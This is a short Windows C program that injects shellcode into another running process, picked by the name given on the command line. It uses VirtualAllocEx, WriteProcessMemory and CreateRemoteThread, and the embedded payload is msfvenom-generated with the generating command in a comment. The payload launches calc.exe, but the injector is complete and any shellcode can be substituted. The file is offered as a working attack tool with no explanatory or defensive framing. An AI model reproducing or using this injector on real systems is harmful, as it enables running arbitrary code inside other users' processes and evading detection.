#include<stdio.h>
#include<windows.h>
#include<TlHelp32.h>
#include<string.h>


//msfvenom -a x64 --platform Windows -p windows/x64/exec cmd=calc.exe -b '\x00\x0a\x0d' -f c -v shellcode
unsigned char shellcode[] =
"\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05\xef\xff"
"\xff\xff\x48\xbb\xb9\xa6\xaa\x1b\xe9\xf9\xaf\xd8\x48\x31\x58"
"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x45\xee\x29\xff\x19\x11"
"\x6f\xd8\xb9\xa6\xeb\x4a\xa8\xa9\xfd\x89\xef\xee\x9b\xc9\x8c"
"\xb1\x24\x8a\xd9\xee\x21\x49\xf1\xb1\x24\x8a\x99\xee\x21\x69"
"\xb9\xb1\xa0\x6f\xf3\xec\xe7\x2a\x20\xb1\x9e\x18\x15\x9a\xcb"
"\x67\xeb\xd5\x8f\x99\x78\x6f\xa7\x5a\xe8\x38\x4d\x35\xeb\xe7"
"\xfb\x53\x62\xab\x8f\x53\xfb\x9a\xe2\x1a\x39\x72\x2f\x50\xb9"
"\xa6\xaa\x53\x6c\x39\xdb\xbf\xf1\xa7\x7a\x4b\x62\xb1\xb7\x9c"
"\x32\xe6\x8a\x52\xe8\x29\x4c\x8e\xf1\x59\x63\x5a\x62\xcd\x27"
"\x90\xb8\x70\xe7\x2a\x20\xb1\x9e\x18\x15\xe7\x6b\xd2\xe4\xb8"
"\xae\x19\x81\x46\xdf\xea\xa5\xfa\xe3\xfc\xb1\xe3\x93\xca\x9c"
"\x21\xf7\x9c\x32\xe6\x8e\x52\xe8\x29\xc9\x99\x32\xaa\xe2\x5f"
"\x62\xb9\xb3\x91\xb8\x76\xeb\x90\xed\x71\xe7\xd9\x69\xe7\xf2"
"\x5a\xb1\xa7\xf6\x82\xf8\xfe\xeb\x42\xa8\xa3\xe7\x5b\x55\x86"
"\xeb\x49\x16\x19\xf7\x99\xe0\xfc\xe2\x90\xfb\x10\xf8\x27\x46"
"\x59\xf7\x53\x53\xf8\xaf\xd8\xb9\xa6\xaa\x1b\xe9\xb1\x22\x55"
"\xb8\xa7\xaa\x1b\xa8\x43\x9e\x53\xd6\x21\x55\xce\x52\x09\x1a"
"\x7a\xef\xe7\x10\xbd\x7c\x44\x32\x27\x6c\xee\x29\xdf\xc1\xc5"
"\xa9\xa4\xb3\x26\x51\xfb\x9c\xfc\x14\x9f\xaa\xd4\xc5\x71\xe9"
"\xa0\xee\x51\x63\x59\x7f\x78\x88\x95\xcc\xf6\xdc\xde\xcf\x1b"
"\xe9\xf9\xaf\xd8";



void inject(DWORD );
int main(int i,char *a[])
{
	if(i!=2)
	{
		printf("Usage %s <program name>",a[0]);
		return 0;
	}

	BOOL f=0;
	HANDLE snap;
	PROCESSENTRY32 pe32;

	snap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);

	if(snap==INVALID_HANDLE_VALUE)
	{
		printf("CreateToolhelp32Snapshot() Failed."); return 0;
	}

	pe32.dwSize=sizeof(pe32);

	if(!Process32First(snap,&pe32))
	{
		printf("Process32First() Failed."); return 0;
	}


	do
	{
		if(0==strncmp(a[1],pe32.szExeFile,strlen(pe32.szExeFile)))
		{
			f=TRUE;
			break;
		}

	}while(Process32Next(snap,&pe32));


	if(!f)
	{
		printf("No infomation found about \"%s\" ",a[1]);
	}
	else
	{
		printf("Program name:%s\nProcess id: %d",pe32.szExeFile,pe32.th32ProcessID);
		printf("\nInjecting shellcode");
		inject(pe32.th32ProcessID);
	}

	return 0;
}


void inject(DWORD pid)
{
	HANDLE phd,h;
	LPVOID shell;

	phd=OpenProcess(PROCESS_ALL_ACCESS,0,pid);

	if(phd==INVALID_HANDLE_VALUE)
	{
		printf("\nOpenProcess() Failed."); return ;
	}

	shell=VirtualAllocEx(phd,0,sizeof(shellcode),MEM_COMMIT,PAGE_EXECUTE_READWRITE);
	if(shell==NULL)
	{
		printf("\nVirtualAllocEx() Failed"); return ; CloseHandle(phd);
	}

	WriteProcessMemory(phd,shell,shellcode,sizeof(shellcode),0);
	printf("\nInjection successfull\n");
	printf("Running Shellcode......\n");

	h=CreateRemoteThread(phd,NULL,2046,(LPTHREAD_START_ROUTINE)shell,NULL,0,0);
	if(h==NULL)
	{
		printf("Failed to Run Shellcode\n"); return ;
	}
}
